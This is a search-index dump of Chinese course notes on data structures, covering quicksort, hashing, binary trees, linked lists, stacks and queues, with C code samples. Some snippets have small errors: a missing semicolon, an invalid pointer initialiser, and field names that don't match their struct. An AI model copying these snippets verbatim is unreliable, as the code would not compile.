<li>\u9009\u62e9\u4e00\u4e2a\u57fa\u51c6\u5143\u7d20\uff08pivot\uff09\uff0c\u5c06\u6570\u7ec4\u5206\u6210\u4e24\u4e2a\u5b50\u6570\u7ec4\uff0c\u5de6\u8fb9\u7684\u5143\u7d20\u90fd\u5c0f\u4e8e\u7b49\u4e8e\u57fa\u51c6\u5143\u7d20\uff0c\u53f3\u8fb9\u7684\u5143\u7d20\u90fd\u5927\u4e8e\u7b49\u4e8e\u57fa\u51c6\u5143\u7d20\uff0c\u7136\u540e\u5bf9\u4e24\u4e2a\u5b50\u6570\u7ec4\u8fdb\u884c\u5feb\u6392\u3001\u5408\u5e76</li> </ul> <pre><code>void QuickSort(int A[], int Left, int Right){\n\u00a0 \u00a0 int i,j;\n\u00a0 \u00a0 if(Right-Left&gt;=Cutoff){\n\u00a0 \u00a0 //\u5dee\u503c\u8f83\u5927\u65f6\u9009\u62e9\u5feb\u901f\u6392\u5e8f\n\u00a0 \u00a0 \u00a0 \u00a0 int Pivot = Median3(A,Left,Right);\n/*\u627e\u5230Median\u540e\uff0c\u53ea\u9700\u8981\u5bf9left+1\u5230Right-2\u7684\u6570\u8fdb\u884c\u68c0\u67e5\u5c31\u53ef\u4ee5\u4e86\uff0c\n*Right-1\u662fPivot\uff0c\u800cLeft\u548cRight\u90fd\u5df2\u7ecf\u5728Median3\u51fd\u6570\u4e2d\u6392\u597d\u5927\u5c0f\u4f4d\u7f6e\u4e86\u3002\n*/\n\u00a0 \u00a0 \u00a0 \u00a0 i = Left;\n\u00a0 \u00a0 \u00a0 \u00a0 j = Right-1;\n\u00a0 \u00a0 \u00a0 \u00a0 for(;;){\n//\u6bd4Pivot\u5927\u7684\u5f80\u540e\u79fb\uff0c\u5c0f\u7684\u5f80\u524d\u79fb\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 while(A[++i]&lt;Pivot){}\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 while(A[--j]&gt;Pivot){}\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 if(i&lt;j)\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 Swap(&amp;A[i],&amp;A[j]);\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 else\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 break;\n\u00a0 \u00a0 \u00a0 \u00a0 }\n\u00a0 \u00a0 \u00a0 \u00a0 Swap(&amp;A[i], &amp;A[Right-1]);\n\u00a0 \u00a0 \u00a0 \u00a0 QuickSort(A, Left, i-1);\n\u00a0 \u00a0 \u00a0 \u00a0 QuickSort(A, i+1, Right);\n\u00a0 \u00a0 }else\n    //\u6570\u636e\u91cf\u8f83\u5c0f\u7684\u65f6\u5019\uff0c\u4f7f\u7528\u63d2\u5165\u6392\u5e8f\u53cd\u800c\u66f4\u5feb\n\u00a0 \u00a0 \u00a0 \u00a0 InsertionSort(A+Left, Right-Left+1);\n}\nint Median3(int A[], int Left, int Right){\n\u00a0 \u00a0 int Center = (Left+Right)/2;\n\u00a0 \u00a0 if(A[Left]&gt;A[Center])\n\u00a0 \u00a0 \u00a0 \u00a0 Swap(&amp;A[Left],&amp;A[Center]);\n\u00a0 \u00a0 if(A[Left]&gt;A[Right])\n\u00a0 \u00a0 \u00a0 \u00a0 Swap(&amp;A[Left],&amp;A[Right]);\n\u00a0 \u00a0 if(A[Center]&gt;A[Right])\n\u00a0 \u00a0 \u00a0 \u00a0 Swap(&amp;A[Center],&amp;A[Right]);\n//\u56fa\u5b9a\u6709A[Left]&lt;A[Center]&lt;A[Right]\uff0c\u6700\u540e\u5c06pivot(\u5373Center)\u8f6c\u79fb\u81f3Right-1\u7684\u4f4d\u7f6e\u6682\u5b58\n\u00a0 \u00a0 Swap(&amp;A[Center],&amp;A[Right-1]);\n\u00a0 \u00a0 return A[Right-1];\n}\n</code></pre> <p>\u5728\u6700\u574f\u60c5\u51b5\u4e0b\uff0cQuickSort\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e5f\u662f\\(O(N^2)\\) \uff0c\u4f46\u662f\u5e73\u5747\u60c5\u51b5\u4e0b\u4e3a \\(O(NlogN)\\)</p> Example <p></p>"},{"location":"Courses/DS/FDS/%E6%8E%92%E5%BA%8F/#bucket-sort","title":"Bucket Sort \u6876\u6392\u5e8f","text":"<p>\u5206\u6cbb\u601d\u60f3</p> <p>\u8bbe\u5b9a k \u4e2a\u6876\uff0c\u6309\u7167\u5bf9\u5e94\u5c5e\u6027\u8bfb\u53d6\u5f85\u6392\u5e8f\u7684\u6570\u7ec4\u7684\u5143\u7d20\u5e76\u653e\u5165\u6876\u4e2d\uff0c\u6700\u540e\u6309\u7167\u987a\u5e8f\u8f93\u51fa\u6876\u3002</p> <p>\u57fa\u6570\u6392\u5e8f</p> <p></p>"},{"location":"Courses/DS/FDS/%E6%8E%92%E5%BA%8F/#hash","title":"Hash \u54c8\u5e0c\u8868","text":"<p>\u6700\u57fa\u7840\u7684\u54c8\u5e0c\u8868</p> <p>\u5e38\u8003\u7684\u662floading density \\(\\lambda=n/(sb)\\) </p> <ul> <li>\u54c8\u5e0c\u51fd\u6570\u8981\u6c42 easy to compute \u4ee5\u53ca minimizes the number of collision</li> <li>\u5bf9\u4e8e\u4e24\u4e2a\u4e0d\u540c\u7684\u5143\u7d20\uff0c\u54c8\u5e0c\u51fd\u6570\u53ef\u80fd\u4f1a\u7ed9\u4ed6\u4eec\u5206\u914d\u540c\u4e00\u4e2a\u503c\uff0c\u8fd9\u5c31\u4f1a\u9020\u6210 collision \uff1b\u800c\u5f53\u5bf9\u5e94\u7684\u8fd9\u4e2abucket\u5df2\u7ecf\u88ab\u585e\u6ee1\u65f6\uff0c\u4f1a\u53d1\u751f overflow</li> <li>\u54c8\u5e0c\u51fd\u6570\u5e94\u8be5 unbiased \uff0c\u8fd9\u79cd\u54c8\u5e0c\u51fd\u6570\u4e5f\u88ab\u79f0\u4e3a uniform hash function<ul> <li>\u5982\uff1aif x is a integer , f(x) can be x%TableSize<ul> <li>\u5f53x\u5927\u90e8\u5206\u90fd\u4ee5 0 \u7ed3\u5c3e\uff0cTableSize\u53d6 10 \u4f1a\u9020\u6210\u975e\u5e38\u591a collision</li> <li>\u56e0\u6b64\uff0c\u5bf9\u4e8e\u6574\u6570keys\uff0c\u6211\u4eec\u901a\u5e38\u9009\u62e9 Prime Number \u4f5c\u4e3aTableSize\uff0c\u8fd9\u5bf9\u968f\u673a\u6570\u76f8\u5bf9\u53cb\u597d</li> </ul> </li> </ul> </li> </ul>"},{"location":"Courses/DS/FDS/%E6%8E%92%E5%BA%8F/#collision","title":"\u89e3\u51b3Collision","text":""},{"location":"Courses/DS/FDS/%E6%8E%92%E5%BA%8F/#_2","title":"\u5206\u79bb\u94fe\u63a5","text":"<p>\u9664\u4e86\u4e0a\u8ff0\u987a\u5e8f\u5b58\u50a8\u7ebf\u6027\u8868\u7684\u65b9\u5f0f\u8868\u793a\u54c8\u5e0c\u8868\u4ee5\u5916\uff0c\u8fd8\u53ef\u4ee5\u91c7\u7528 Separate Chaining (\u94fe\u8868)\u7684\u5f62\u5f0f\uff0c\u4f7f\u5f97overflow\u4e0d\u518d\u53d1\u751f\u3002</p>"},{"location":"Courses/DS/FDS/%E6%8E%92%E5%BA%8F/#_3","title":"\u5f00\u653e\u5bfb\u5740","text":"<p>\u53e6\u4e00\u79cd\u907f\u514d overflow \u7684\u65b9\u5f0f\u662f Open Addressing (\u5f00\u653e\u5bfb\u5740) \u3002\u82e5\u662f\u5f53\u524d\u4f4d\u7f6e\u5df2\u6ee1\uff0c\u5b83\u4f1a\u9075\u5faa\u4e00\u79cd\u81ea\u5b9a\u4e49\u7684\u89c4\u5219\u5bfb\u627e\u8868\u4e2d\u4e0b\u4e00\u4e2a\u7a7a\u4f4d\u5e76\u585e\u5165\uff0c\u5e38\u89c1\u7684\u6709 Linear Probing \uff0c\u8fd9\u79cd\u65b9\u5f0f\u53ef\u4ee5\u786e\u4fdd\u6240\u6709\u7a7a\u4f4d\u90fd\u88ab\u4f7f\u7528\uff0c\u4f46\u662f\u5f80\u5f80\u6709\u7740\u8f83\u9ad8\u7684\u8fd0\u7b97\u65f6\u95f4\u3002</p> <p>\u53e6\u4e00\u79cd\u641c\u5bfb\u65b9\u5f0f\u53eb\u505a Quadratic Probing (\u4e8c\u6b21\u63a2\u6d4b) \u3002</p> <ul> <li>\\(f(i)=i^2\\) /*\u4e00\u4e2aSimple Quadratic Probing Function*/</li> <li>\u3010Theorem\u3011\uff1a\u5982\u679c Table Size \u662f\u8d28\u6570\uff0c\u4e14 Table \u81f3\u5c11\u6709\u4e00\u534a\u7a7a\u4f4d\uff0c\u5219\u4f7f\u7528\u4e8c\u6b21\u63a2\u6d4b\u4e00\u5b9a\u80fd\u627e\u5230\u7a7a\u4f4d\u3002</li> <li>\u5982\u679c Table Size \u4e3a\u5f62\u5f0f\u4e3a 4k+3 \u7684\u8d28\u6570\uff0c\u5219\u91c7\u7528 \\(f(i)=(-1)^ii^2\\) \u53ef\u4ee5\u904d\u5386\u6574\u4e2a Table</li> </ul> <p>\u53cc\u91cd\u54c8\u5e0c (Double Hasing) \uff0c\u5982\u679c\u7b2c\u4e00\u4e2a\u54c8\u5e0c\u51fd\u6570\u63a2\u6d4b\u5230\u7684\u4f4d\u7f6e\u5df2\u7ecf\u88ab\u5360\u7528\uff0c\u5219\u4f7f\u7528\u7b2c\u4e8c\u4e2a\u54c8\u5e0c\u51fd\u6570\u5f97\u5230\u4e00\u4e2a\u95f4\u9694\u503c\uff0c\u4e0e\u7b2c\u4e00\u4e2a\u51fd\u6570\u7ed3\u679c\u76f8\u52a0</p>"},{"location":"Courses/DS/FDS/%E6%8E%92%E5%BA%8F/#_4","title":"\u518d\u54c8\u5e0c\u6cd5","text":"<p>Rehashing \u901a\u5e38\u53d6 TableSize \u4e3a\u6700\u63a5\u8fd1\u539f\u5927\u5c0f\u7684\u4e24\u500d\u503c\u7684 Prime\uff0c\u518d\u901a\u8fc7\u65b0\u7684 hash \u51fd\u6570\u5c06\u539f\u6709\u5143\u7d20\u91cd\u65b0\u586b\u5165\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(N)\\)</p>"},{"location":"Courses/DS/FDS/%E6%A0%91/","title":"\u6811","text":""},{"location":"Courses/DS/FDS/%E6%A0%91/#_1","title":"\u6811","text":"<p> \u7ea6 882 \u4e2a\u5b57  61 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 5 \u5206\u949f</p>"},{"location":"Courses/DS/FDS/%E6%A0%91/#tree","title":"Tree \u6811","text":"<ul> <li>FirstChild-NextSibling \u8868\u793a\u6cd5<ul> <li>\u8bb0\u5f55\u7b2c\u4e00\u4e2a\u5b50\u8282\u70b9\u548c\u4e0b\u4e00\u4e2a\u5144\u5f1f\u8282\u70b9</li> <li>\u56e0\u4e3a\u4e00\u68f5\u6811\u7684\u513f\u5b50\u987a\u5e8f\u53ef\u4ee5\u6539\u53d8\uff0c\u6240\u4ee5\u4e00\u68f5\u6811\u7684\u8868\u793a\u65b9\u5f0f\u4e0d\u552f\u4e00</li> <li>\u6bcf\u68f5\u6811\u90fd\u53ef\u4ee5\u901a\u8fc7 FirstChild-NextSibling \u8868\u793a\u6210 Binary Tree<ul> <li>\u539f\u6811 T \u7684\u540e\u5e8f\u904d\u5386\u548c\u4e8c\u53c9\u6811\u8868\u793a BT \u7684\u4e2d\u5e8f\u904d\u5386\u76f8\u540c\uff0c\u4e14\u4e24\u8005\u524d\u5e8f\u904d\u5386\u76f8\u540c</li> </ul> </li> </ul> </li> </ul> <p>\u7531\u4e8e \\(2n_2 + n_1 +1= n_2 +n_1+ n_0\\) \uff0c\u6240\u4ee5\\(n_2= n_0-1\\)\uff0c\u5373\u5ea6\u4e3a 2 \u7684\u8282\u70b9\u4e2a\u6570\u4e3a\u53f6\u7ed3\u70b9\u4e2a\u6570\u51cf\u4e00\u3002</p> <pre><code>typedef struct TreeNode *Tree;\nstruct TreeNode {\n    int Element;\n    Tree Left;\n    Tree Right;\n};\n\nTree newnode(int data)\n{\n    Tree temp = (Tree)malloc(sizeof(struct TreeNode));\n    temp-&gt;element = data;\n    temp-&gt;left = NULL;\n    temp-&gt;right = NULL;\n    return temp;\n}\n</code></pre>"},{"location":"Courses/DS/FDS/%E6%A0%91/#_2","title":"\u8fed\u4ee3\u7248\u4e2d\u5e8f\u904d\u5386","text":"<pre><code>void iter_inorder(tree_ptr tree) {\n    Stack S = create_stack();\n    for (;;) {\n        for (; tree; tree = tree-&gt;left)\n            push(S, tree);\n        tree = top(S); pop(S);\n        if (!tree) break;\n        visit(tree-&gt;element);\n        tree = tree-&gt;right;\n    }\n}\n</code></pre>"},{"location":"Courses/DS/FDS/%E6%A0%91/#_3","title":"\u4ece\u4e2d\u5e8f\u904d\u5386\u548c\u540e\u5e8f\u904d\u5386\u5f97\u5230\u4e00\u4e2a\u4e8c\u53c9\u6811","text":"<pre><code>int main(void){\n\u00a0 \u00a0 Tree T;\n\u00a0 \u00a0 int inorder[MAXN], postorder[MAXN], N, i;\n\u00a0 \u00a0 scanf(\"%d\", &amp;N);\n\u00a0 \u00a0 for (i=0; i&lt;N; i++) scanf(\"%d\", &amp;inorder[i]);\n\u00a0 \u00a0 for (i=0; i&lt;N; i++) scanf(\"%d\", &amp;postorder[i]);\n\u00a0 \u00a0 T = BuildTree(inorder, postorder, N);\n}\n\nTree BuildTree(int inorder[],int postorder[],int N){\n\u00a0 \u00a0 Tree root=(Tree)malloc(sizeof(struct TreeNode));\n\u00a0 \u00a0 int index;\n\u00a0 \u00a0 if (N&lt;=0) {\n\u00a0 \u00a0 \u00a0 \u00a0 return NULL;\n\u00a0 \u00a0 }else if (N==1) {\n\u00a0 \u00a0 \u00a0 \u00a0 root-&gt;Element=postorder[N-1];\n\u00a0 \u00a0 \u00a0 \u00a0 root-&gt;Left=NULL;\n\u00a0 \u00a0 \u00a0 \u00a0 root-&gt;Right=NULL;\n\u00a0 \u00a0 \u00a0 \u00a0 return root;\n\u00a0 \u00a0 }\n\u00a0 \u00a0 root-&gt;Element=postorder[N-1];\n\u00a0 \u00a0 for (int i = 0;i &lt; N;i++)\n\u00a0 \u00a0 \u00a0 \u00a0 if (inorder[i]==postorder[N-1]) {\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 index=i;\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 break;\n\u00a0 \u00a0 \u00a0 \u00a0 }\n\u00a0 \u00a0 root-&gt;Left=BuildTree(inorder,postorder,index);\n\u00a0 \u00a0 root-&gt;Right=BuildTree(inorder+index+1,postorder+index,N-index-1);\n\u00a0 \u00a0 return root;\n}\n/*\n *\u82e5\u662f\u60f3\u8981\u4ee5zigzagging order\u8f93\u51fa\u7684\u8bdd\uff0c\u5efa\u7acb\u4e24\u4e2a\u6808\uff0c\n *\u7b2c\u4e00\u4e2a\u6808\u5f39\u51fa\u9876\u7aef\u540e\u4f9d\u6b21\u5c06\u5de6\u8282\u70b9\u548c\u53f3\u8282\u70b9\u538b\u5165\u7b2c\u4e8c\u4e2a\u6808\u4e2d\uff1b\n *\u7b2c\u4e8c\u4e2a\u6808\u5f39\u51fa\u9876\u7aef\u540e\u4e00\u6b21\u5c06\u53f3\u8282\u70b9\u548c\u5de6\u8282\u70b9\u538b\u5165\u7b2c\u4e00\u4e2a\u6808\u4e2d\uff0c\u6bcf\u4e2a\u6808\u7a7a\u4e86\u4e4b\u540e\u8f6e\u6362\u5230\u4e0b\u4e00\u4e2a\u6808\n */\n</code></pre>"},{"location":"Courses/DS/FDS/%E6%A0%91/#threaded","title":"\u7ebf\u7d22\u4e8c\u53c9\u6811 Threaded","text":"<p>\u5efa\u6811\u7684\u65f6\u5019\uff0c\u6bcf\u4e2a\u8282\u70b9\u662f\u6709\u4e24\u4e2a\u6307\u9488\uff08\u6307\u5411\u4e00\u5de6\u4e00\u53f3\uff09\u7684\uff0cN\u4e2a\u8282\u70b9\uff0c\u4e5f\u5c31\u662f2N\u4e2a\u6307\u9488\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u4e0d\u662fNull\u7684\u53ea\u6709N-1\u4e2a\uff0c\u56e0\u4e3a\u9664\u4e86\u6839\u90fd\u6709\u4e00\u4e2a\u6307\u5411\u8fd9\u4e2a\u8282\u70b9\uff0c\u8fd8\u6709N+1\u4e2a\u6307\u9488\u6ca1\u6709\u7528\uff0c\u7ebf\u7d22\u4e8c\u53c9\u6811\u5c31\u662f\u4e3a\u4e86\u8ba9\u8fd9N+1\u4e2a\u8282\u70b9\u6709\u7528\uff0c\u6307\u5411\u7684\u5c31\u662f\u4f60\u7684\u6392\u5e8f\u65b9\u5f0f\u7ed9\u51fa\u540e\uff0c\u90a3\u4e2a\u7ebf\u6027\u6392\u5217\u7684\u201c\u524d\u9a71\u201d\u548c\u201c\u540e\u9a71\u201d\uff0c\u5de6\u6307\u9488\u6307\u5411\u524d\u9a71\uff0c\u53f3\u6307\u9488\u6307\u5411\u540e\u9a71\u3002</p> <p>\u56e0\u6b64\u5199\u9009\u62e9\u9898\u7684\u65f6\u5019\u53ef\u4ee5\u5148\u5c06\u904d\u5386\uff08\u65e0\u8bba\u662f\u524d\u5e8f\u8fd8\u662f\u540e\u5e8f\u8fd8\u662f\u4e2d\u5e8f\uff09\u5217\u51fa\u6765\uff0c\u518d\u5c06\u865a\u7ebf\u8fde\u4e0a\u53bb\u3002</p> <p>Example</p> <p></p>"},{"location":"Courses/DS/FDS/%E6%A0%91/#binary-search-tree","title":"\u4e8c\u53c9\u641c\u7d22\u6811 Binary Search Tree","text":"<ul> <li>\u4e8c\u53c9\u641c\u7d22\u6811\u662f\u4e00\u79cd\u4e8c\u53c9\u6811\uff0c\u975e\u7a7a\u60c5\u51b5\u4e0b\u670d\u4ece\u4ee5\u4e0b\u6027\u8d28\uff1a<ul> <li>\u6240\u6709\u8282\u70b9\u90fd\u6709\u4e0d\u540c\u7684\u00a0key\uff08\u4e00\u4e2a\u6574\u6570\uff09</li> <li>\u5de6 \uff1c \u6839 \uff1c \u53f3</li> <li>\u5de6\u5b50\u6811\u548c\u53f3\u5b50\u6811\u4e5f\u90fd\u662f\u4e8c\u53c9\u641c\u7d22\u6811</li> </ul> </li> <li>\u4e8c\u53c9\u641c\u7d22\u6811\u7684\u4e2d\u5e8f\u904d\u5386\u662f\u6709\u5e8f\u7684</li> <li>\u67e5\u627e<ul> <li>\u4ece\u6839\u8282\u70b9\u5f00\u59cb\uff0c\u5982\u679c\u00a0key\u00a0\u5c0f\u4e8e\u5f53\u524d\u8282\u70b9\u7684\u00a0key\uff0c\u5c31\u5f80\u5de6\u5b50\u6811\u627e\uff0c\u5426\u5219\u5f80\u53f3\u5b50\u6811\u627e</li> <li>\u76f4\u5230\u627e\u5230\u00a0key\u00a0\u76f8\u7b49\u7684\u8282\u70b9\uff0c\u6216\u8005\u627e\u5230\u7a7a\u8282\u70b9</li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\u00a0\ud835\udc42(\u210e)\uff0c\u210e\u00a0\u4e3a\u6811\u7684\u9ad8\u5ea6\uff0c\u5373\u00a0\ud835\udc42(log\u2061\ud835\udc5b)</li> </ul> </li> <li>\u67e5\u8be2\u6700\u5c0f\u503c\uff1a\u904d\u5386\u5230\u6700\u5de6\u8fb9\u7684\u8282\u70b9</li> <li>\u67e5\u8be2\u6700\u5927\u503c\uff1a\u904d\u5386\u5230\u6700\u53f3\u8fb9\u7684\u8282\u70b9</li> <li>\u63d2\u5165<ul> <li>\u4ece\u6839\u8282\u70b9\u5f00\u59cb\uff0c\u5982\u679c\u00a0key\u00a0\u5c0f\u4e8e\u5f53\u524d\u8282\u70b9\u7684\u00a0key\uff0c\u5c31\u5728\u5de6\u5b50\u6811\u9012\u5f52\u63d2\u5165\uff0c\u5927\u4e8e\u5c31\u5728\u53f3\u5b50\u6811\u9012\u5f52\u63d2\u5165</li> <li>\u76f4\u5230\u627e\u5230\u7a7a\u8282\u70b9\uff0c\u7136\u540e\u63d2\u5165</li> <li>\u6216\u8005\u627e\u5230\u76f8\u540c\u7684\u00a0key\uff0c\u5ffd\u7565</li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\u00a0\ud835\udc42(logn)</li> </ul> </li> <li>\u5220\u9664<ul> <li>\u5220\u9664\u53f6\u8282\u70b9\uff1a\u76f4\u63a5\u5220\u9664\u5373\u53ef</li> <li>\u5220\u9664\u53ea\u6709\u4e00\u4e2a\u513f\u5b50\u7684\u8282\u70b9\uff1a\u76f4\u63a5\u5220\u9664\uff0c\u7136\u540e\u628a\u513f\u5b50\u63a5\u4e0a</li> <li>\u5220\u9664\u6709\u4e24\u4e2a\u513f\u5b50\u7684\u8282\u70b9<ul> <li>Step 1: \u5c06\u8be5\u8282\u70b9\u66ff\u6362\u4e3a\u5de6\u5b50\u6811\u7684\u6700\u5927\u503c\uff0c\u6216\u53f3\u5b50\u6811\u7684\u6700\u5c0f\u503c</li> <li>Step 2: \u5220\u9664\u5de6\u5b50\u6811\u7684\u6700\u5927\u503c\uff0c\u6216\u53f3\u5b50\u6811\u7684\u6700\u5c0f\u503c</li> </ul> </li> <li>\u5728\u5220\u9664\u4e0d\u591a\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u4ec5\u627e\u5230\u8be5\u5220\u9664\u8282\u70b9\u5e76\u6807\u8bb0\u5220\u9664\uff0c\u8bbf\u95ee\u65f6\u5ffd\u7565\u8fd9\u4e2a\u8282\u70b9\u5373\u53ef</li> </ul> </li> </ul>"},{"location":"Courses/DS/FDS/%E6%A0%91/#decision-tree-for-binary-search","title":"\u6298\u534a\u67e5\u627e\u5224\u5b9a\u6811 Decision Tree for binary search","text":"<p>Among the following binary trees, which one can possibly be the decision tree (the external nodes are excluded) for binary search?</p> <p></p> <p>\u5176\u5b9e\u662f\u8981\u5224\u65ad\u54ea\u68f5\u6811\u53ef\u4ee5\u662f\u6298\u534a\u67e5\u627e\u5224\u5b9a\u6811\uff0c\u7b54\u6848\u9009 A\u3002</p> <ul> <li>\u6298\u534a\u67e5\u627e\u5224\u5b9a\u6811\u8981\u6c42\u53ef\u4ee5\u901a\u8fc7\u5de6\u53f3\u5b50\u8282\u70b9\u7684\u503c\u627e\u5230 mid\uff0c\u53ef\u4ee5\u901a\u8fc7\u6839\u8282\u70b9\u7684\u5de6\u53f3\u5b50\u6811\u5927\u5c0f\u5224\u65ad\u6c42mid\u65f6\u5e94\u8be5\u53d6\u4e0a\u754c\u8fd8\u662f\u4e0b\u754c\u3002<ul> <li>\u5982\u679c\u53f6\u8282\u70b9\u7edf\u4e00\u671d\u5de6\u504f\uff0c\u5219 \\(mid = \\lceil \\frac{l+r}{2}\\rceil\\)</li> <li>\u5982\u679c\u53f6\u8282\u70b9\u7edf\u4e00\u671d\u53f3\u504f\uff0c\u5219 \\(mid = \\lfloor\\frac{l+r}{2} \\rfloor\\)</li> </ul> </li> <li>\u5982\u4e0a\u56fe A \uff0c\u5de6\u5b50\u6811\u6709 5 \u4e2a\uff0c\u53f3\u5b50\u6811\u6709 4 \u4e2a\uff0c\u56e0\u6b64mid\u5e94\u8be5\u7b49\u4e8e(left+right)/2+1\uff08\u53d6\u5927\uff09</li> <li>\u56e0\u6b64\uff0c\u6298\u534a\u5224\u5b9a\u4e8c\u53c9\u6811\u7684\u53f6\u8282\u70b9\u5e94\u5f80\u540c\u4e00\u4fa7\u504f</li> </ul>"},{"location":"Courses/DS/FDS/%E7%BA%BF%E6%80%A7%E8%A1%A8/","title":"\u7ebf\u6027\u8868","text":""},{"location":"Courses/DS/FDS/%E7%BA%BF%E6%80%A7%E8%A1%A8/#_1","title":"\u7ebf\u6027\u8868","text":"<p> \u7ea6 461 \u4e2a\u5b57  187 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 5 \u5206\u949f</p>"},{"location":"Courses/DS/FDS/%E7%BA%BF%E6%80%A7%E8%A1%A8/#sequential-linear-list","title":"Sequential Linear List \u987a\u5e8f\u5b58\u50a8\u7ebf\u6027\u8868(\u6570\u7ec4)","text":"<pre><code>typedef struct{\n    int *data;    //\u6307\u793a\u52a8\u6001\u5206\u914d\u6570\u7ec4\u7684\u6307\u9488\n    int MaxSize;  //\u987a\u5e8f\u8868\u6700\u5927\u5bb9\u91cf\n    int length;   //\u987a\u5e8f\u8868\u5f53\u524d\u5bb9\u91cf\n} SeqList;\n</code></pre> <ol> <li>\u968f\u673a\u5b58\u53d6\uff0c\u5373\u5728 \\(O(1)\\) \u65f6\u95f4\u5185\u627e\u5230\u7b2c i \u4e2a\u5143\u7d20  </li> <li>\u5b58\u50a8\u5bc6\u5ea6(\u5b58\u50a8\u5229\u7528\u7387)\u9ad8\uff0c\u6bcf\u4e2a\u8282\u70b9\u53ea\u5b58\u50a8\u6570\u636e\u5143\u7d20  </li> <li>\u62d3\u5c55\u5bb9\u91cf\u4e0d\u65b9\u4fbf</li> <li>\u63d2\u5165\u548c\u5220\u9664\u4e0d\u65b9\u4fbf\uff0c\u9700\u8981\u79fb\u52a8\u5927\u91cf\u5143\u7d20  </li> <li>\u5143\u7d20\u7684\u903b\u8f91\u987a\u5e8f\u4e0e\u7269\u7406\u987a\u5e8f\u76f8\u540c</li> </ol>"},{"location":"Courses/DS/FDS/%E7%BA%BF%E6%80%A7%E8%A1%A8/#linked-list","title":"Linked List \u94fe\u8868\u7684\u521b\u5efa\u4e0e\u6dfb\u52a0\u8282\u70b9","text":"<p>\u5355\u5411\u94fe\u8868\u901a\u5e38\u6709\u4e2a dummy head\uff0c\u56e0\u6b64\u5934\u6307\u9488\u5b58\u653e\u7684\u4e0d\u662f\u5934\u7ed3\u70b9\u7684\u5185\u5bb9</p> <pre><code>typedef struct Node *PtrToNode;\nstruct Node {\n    int element\n    PtrToNode next;\n};\nPtrToNode a = {0,NULL};\nPtrToNode newnode = (PtrToNode)malloc(sizeof(struct Node));\nnewnode-&gt;element = 1;\nnewnode-&gt;next = NULL;\na-&gt;next = newnode;\n</code></pre>"},{"location":"Courses/DS/FDS/%E7%BA%BF%E6%80%A7%E8%A1%A8/#stack","title":"Stack \u6808","text":"<pre><code>struct stackrecord{\n    int maxsize;\n    int top;\n    int *array;\n};\nstruct stackrecord stack={Max,0};\nstack.array = (int *)calloc(stack.maxsize+1,sizeof(int));\n</code></pre>"},{"location":"Courses/DS/FDS/%E7%BA%BF%E6%80%A7%E8%A1%A8/#_2","title":"\u4ee5\u94fe\u8868\u7684\u65b9\u5f0f\u5b9e\u73b0\u6808","text":"<pre><code>struct Node {\n    int data;\n    struct Node* next;\n};\n\nstruct Stack {\n    int size;\n    struct Node* top;\n};\n\nstruct Stack* createStack() {\n    struct Stack* stack = (struct Stack*) malloc(sizeof(struct Stack));\n    stack-&gt;size = 0;\n    stack-&gt;top = NULL;\n    return stack;\n}\n\nvoid push(struct Stack* stack, int data) {\n    struct Node* newNode = (struct Node*) malloc(sizeof(struct Node));\n    newNode-&gt;data = data;\n    newNode-&gt;next = stack-&gt;top;\n    stack-&gt;top = newNode;\n    stack-&gt;size++;\n}\n\nint pop(struct Stack* stack) {\n    if (stack-&gt;size == 0) {\n        return -1;\n    }\n    struct Node* temp = stack-&gt;top;\n    int data = temp-&gt;data;\n    stack-&gt;top = temp-&gt;next;\n    free(temp); // temp \u7684\u4f5c\u7528\u5c31\u662f\u91ca\u653e\u7a7a\u95f4\n    stack-&gt;size--;\n    return data;\n}\nstruct Stack* stack = createStack();\n</code></pre> <p>\u987a\u5e8f\u6808</p> <p>\u6307\u5728\u7269\u7406\u5185\u5b58\u4e0a\u662f\u6709\u5e8f\u7684\uff0c\u5143\u7d20\u503c\u7684\u5927\u5c0f\u4e0d\u4e00\u5b9a\u6709\u5e8f</p>"},{"location":"Courses/DS/FDS/%E7%BA%BF%E6%80%A7%E8%A1%A8/#queue","title":"Queue \u961f\u5217","text":"<pre><code>struct Node {\n    int data;\n    struct Node* next;\n};\n\nstruct Queue {\n    struct Node *front, *rear;\n};\n\nstruct Node* newNode(int data) {\n    struct Node* temp = (struct Node*)malloc(sizeof(struct Node));\n    temp-&gt;data = data;\n    temp-&gt;next = NULL;\n    return temp;\n}\n\nstruct Queue* createQueue() {\n    struct Queue* q = (struct Queue*)malloc(sizeof(struct Queue));\n    q-&gt;front = q-&gt;rear = NULL;\n    return q;\n}\n\nvoid enQueue(struct Queue* q, int data) {\n    struct Node* temp = newNode(data);\n    if (q-&gt;rear == NULL) {\n        q-&gt;front = q-&gt;rear = temp;\n        return;\n    }\n    q-&gt;rear-&gt;next = temp;\n    q-&gt;rear = temp;\n}\n\nint deQueue(struct Queue* q) {\n    if (q-&gt;front == NULL)\n        return -1;\n    struct Node* temp = q-&gt;front;\n    int data = temp-&gt;data;\n    q-&gt;front = q-&gt;front-&gt;next;\n    if (q-&gt;front == NULL)\n        q-&gt;rear = NULL;\n    free(temp);\n    return data;\n}\n</code></pre>"},{"location":"Courses/DS/FDS/%E7%BA%BF%E6%80%A7%E8%A1%A8/#priority-queue","title":"Priority Queue \u5806","text":"<pre><code>typedef struct HeapStruct *PriorityQueue; //\u8bbe\u4e3a\u6307\u9488\u5f62\u5f0f\u65b9\u4fbf\u76f4\u63a5\u5728\u51fd\u6570\u4e2d\u4fee\u6539\u503c\nstruct HeapStruct {\n    int *Elements;\n    int Capacity;\n    int Size;\n};\n// 